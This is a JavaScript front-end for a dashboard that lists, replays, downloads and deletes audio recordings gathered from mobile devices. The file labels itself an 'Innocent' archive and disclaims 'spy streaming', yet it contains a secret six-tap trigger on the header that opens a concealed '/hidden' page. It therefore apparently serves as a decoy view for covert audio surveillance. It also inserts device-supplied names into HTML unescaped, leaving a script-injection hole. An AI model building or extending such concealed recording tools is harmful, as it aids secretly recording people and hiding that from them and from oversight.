/**
 * app.js — Innocent Main Recording Archive JS
 * Displays and replays Main recorded sessions only.
 * No live spy streaming, no remote device controller.
 */

const API_DASHBOARD = '/api/v1/dashboard';
const POLL_INTERVAL = 5000;

const state = {
    dashboardSessions: [],
    currentSession: null,
    deleteTargetId: null,
};

const ui = {
    sessionList: document.getElementById('session-list'),
    sessionCount: document.getElementById('session-count'),
    btnRefresh: document.getElementById('btn-refresh'),
    clientFilter: document.getElementById('client-filter'),
    
    // Stats
    statSessions: document.getElementById('stat-sessions'),
    statChunks: document.getElementById('stat-chunks'),
    statDuration: document.getElementById('stat-duration'),
    statStorage: document.getElementById('stat-storage'),
    
    // Inline Player
    playerBox: document.getElementById('inline-player-box'),
    audioPlayer: document.getElementById('main-audio-player'),
    playerTitle: document.getElementById('player-title'),
    playerMeta: document.getElementById('player-meta'),
    btnClosePlayer: document.getElementById('btn-close-player'),
    
    // Modal
    modalOverlay: document.getElementById('modal-overlay'),
    modalSessionId: document.getElementById('modal-session-id'),
    modalCancel: document.getElementById('modal-cancel'),
    modalConfirm: document.getElementById('modal-confirm'),
    toastContainer: document.getElementById('toast-container'),
    
    // Secret Trigger to open /hidden
    secretTriggerHeader: document.getElementById('secret-trigger-header'),
};

document.addEventListener('DOMContentLoaded', () => {
    bindEvents();
    fetchMainData();
    setInterval(fetchMainData, POLL_INTERVAL);
});

function bindEvents() {
    ui.btnRefresh?.addEventListener('click', fetchMainData);
    ui.clientFilter?.addEventListener('change', () => renderSessionsList());

    ui.btnClosePlayer?.addEventListener('click', () => {
        if (ui.audioPlayer) ui.audioPlayer.pause();
        if (ui.playerBox) ui.playerBox.style.display = 'none';
    });

    ui.modalCancel?.addEventListener('click', closeModal);
    ui.modalConfirm?.addEventListener('click', confirmDelete);

    // Secret 6-tap Trigger on Header -> Navigates to /hidden
    if (ui.secretTriggerHeader) {
        let secretClicks = 0;
        let lastSecretClick = 0;
        ui.secretTriggerHeader.addEventListener('click', () => {
            const now = Date.now();
            if (now - lastSecretClick < 500) {
                secretClicks++;
            } else {
                secretClicks = 1;
            }
            lastSecretClick = now;

            if (secretClicks >= 6) {
                secretClicks = 0;
                window.location.href = '/hidden';
            }
        });
    }
}

async function fetchMainData() {
    await Promise.all([fetchMainStats(), fetchMainSessions()]);
}

async function fetchMainStats() {
    try {
        const res = await fetch(`${API_DASHBOARD}/stats?type=main`);
        if (!res.ok) return;
        const data = await res.json();
        
        if (ui.statSessions) ui.statSessions.textContent = data.total_sessions || 0;
        if (ui.statChunks) ui.statChunks.textContent = data.total_chunks || 0;
        if (ui.statDuration) ui.statDuration.textContent = data.total_duration_human || '00:00';
        if (ui.statStorage) ui.statStorage.textContent = data.total_size_human || '0 B';
    } catch (e) {
        console.error('Stats fetch error:', e);
    }
}

async function fetchMainSessions() {
    try {
        const res = await fetch(`${API_DASHBOARD}/sessions?type=main&limit=200`);
        if (!res.ok) return;
        const data = await res.json();
        state.dashboardSessions = data.sessions || [];
        renderSessionsList();
    } catch (e) {
        console.error('Sessions fetch error:', e);
    }
}

function renderSessionsList() {
    const allSessions = state.dashboardSessions;

    if (ui.clientFilter) {
        const selectedClient = ui.clientFilter.value;
        const clients = [...new Set(allSessions.map(s => s.client_name).filter(Boolean))];
        
        let filterHtml = '<option value="">All Devices / Clients</option>';
        clients.forEach(c => {
            filterHtml += `<option value="${c}" ${c === selectedClient ? 'selected' : ''}>📱 ${c}</option>`;
        });
        ui.clientFilter.innerHTML = filterHtml;
    }

    const filterVal = ui.clientFilter ? ui.clientFilter.value : '';
    const sessions = filterVal ? allSessions.filter(s => s.client_name === filterVal) : allSessions;

    if (ui.sessionCount) {
        ui.sessionCount.textContent = `${sessions.length} recording${sessions.length !== 1 ? 's' : ''}`;
    }

    if (sessions.length === 0) {
        ui.sessionList.innerHTML = '<li class="empty-state">No audio recordings found.</li>';
    } else {
        ui.sessionList.innerHTML = generateSessionsHtml(sessions);
    }
}

function generateSessionsHtml(sessionsArray) {
    return sessionsArray.map(s => {
        const duration = formatTime(s.total_duration || 0);
        const dateStr = formatIST(s.created_at);
        const sizeStr = formatSize(s.total_bytes || 0);
        const client = s.client_name || 'Audio Device';
        const shortId = s.session_id.slice(0, 8);
        const downloadUrl = `/api/v1/broadcasts/${s.session_id}/export-channel`;
        const chunkZipUrl = `/api/v1/broadcasts/${s.session_id}/export-channel?format=zip`;

        return `
            <li class="session-card session-card--ended">
                <div class="session-card__header">
                    <div class="session-card__device">
                        <div class="device-icon">🎙️</div>
                        <div class="device-details">
                            <div class="session-card__title">
                                <span class="client-name">${client}</span>
                                <span class="badge badge--ended">SAVED</span>
                            </div>
                            <div class="device-sub">${s.device_info || 'Mobile Audio Recording'}</div>
                        </div>
                    </div>

                    <div class="session-card__quick-play">
                        <button class="btn-quick-play" onclick="playSessionAudio('${s.session_id}', '${client}', '${dateStr}')" title="Play Recording">
                            ▶ Play Recording
                        </button>
                    </div>
                </div>

                <div class="session-card__meta-bar">
                    <div class="meta-chip" title="Total Duration">
                        <span class="meta-chip__icon">⏱️</span>
                        <span class="meta-chip__val">${duration}</span>
                    </div>
                    <div class="meta-chip" title="Total Chunks">
                        <span class="meta-chip__icon">📦</span>
                        <span class="meta-chip__val">${(s.total_chunks || 0).toLocaleString()} chunks</span>
                    </div>
                    <div class="meta-chip" title="Audio Data Size">
                        <span class="meta-chip__icon">💾</span>
                        <span class="meta-chip__val">${sizeStr}</span>
                    </div>
                    <div class="meta-chip" title="Recorded On (IST)">
                        <span class="meta-chip__icon">📅</span>
                        <span class="meta-chip__val">${dateStr}</span>
                    </div>
                    <div class="meta-chip meta-chip--id" onclick="copySessionId('${s.session_id}')" title="Copy Recording ID">
                        <span class="meta-chip__icon">🆔</span>
                        <code class="meta-chip__code">${shortId}...</code>
                    </div>
                </div>

                <div class="session-card__toolbar">
                    <div class="action-group-primary">
                        <a href="${downloadUrl}" target="_blank" class="action-btn action-btn--audio" title="Download Audio File">
                            <span class="action-btn__icon">📥</span>
                            <span>Download Audio</span>
                        </a>
                        <a href="${chunkZipUrl}" target="_blank" class="action-btn action-btn--zip" title="Download Chunks ZIP Archive">
                            <span class="action-btn__icon">🗜️</span>
                            <span>Chunks ZIP</span>
                        </a>
                    </div>

                    <div class="action-group-secondary">
                        <button class="action-btn action-btn--danger" onclick="openDeleteModal('${s.session_id}')" title="Delete Recording">
                            <span class="action-btn__icon">🗑️</span>
                        </button>
                    </div>
                </div>
            </li>
        `;
    }).join('');
}

function playSessionAudio(sessionId, clientName, dateStr) {
    if (!ui.playerBox || !ui.audioPlayer) return;
    ui.playerTitle.textContent = `Playing: ${clientName}`;
    ui.playerMeta.textContent = `Recorded on ${dateStr} (ID: ${sessionId.slice(0, 8)}...)`;
    ui.audioPlayer.src = `/api/v1/broadcasts/${sessionId}/export-channel`;
    ui.playerBox.style.display = 'block';
    ui.audioPlayer.play().catch(e => console.error('Audio play error:', e));
}

function openDeleteModal(sessionId) {
    state.deleteTargetId = sessionId;
    ui.modalSessionId.textContent = `Recording ID: ${sessionId}`;
    ui.modalOverlay.classList.add('active');
}

function closeModal() {
    state.deleteTargetId = null;
    ui.modalOverlay.classList.remove('active');
}

async function confirmDelete() {
    if (!state.deleteTargetId) return;
    try {
        const res = await fetch(`${API_DASHBOARD}/sessions/${state.deleteTargetId}`, { method: 'DELETE' });
        if (res.ok) {
            closeModal();
            fetchMainData();
            showToast('Recording deleted successfully', 'success');
        }
    } catch (e) {
        console.error('Delete error:', e);
    }
}

function showToast(msg, type = 'info') {
    if (!ui.toastContainer) return;
    const toast = document.createElement('div');
    toast.className = `toast toast--${type}`;
    let icon = type === 'success' ? '✅' : 'ℹ️';
    toast.innerHTML = `<span>${icon}</span><span>${msg}</span>`;
    ui.toastContainer.appendChild(toast);
    requestAnimationFrame(() => toast.classList.add('show'));
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, 2800);
}

function copySessionId(id) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(id).then(() => showToast(`Copied ID: ${id.slice(0, 8)}...`, 'success'));
    }
}

function formatIST(dateStr) {
    if (!dateStr) return '—';
    try {
        const d = new Date(dateStr);
        return d.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', dateStyle: 'medium', timeStyle: 'short', hour12: true });
    } catch {
        return dateStr;
    }
}

function formatTime(seconds) {
    seconds = Math.max(0, Math.floor(seconds));
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    if (h > 0) return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}
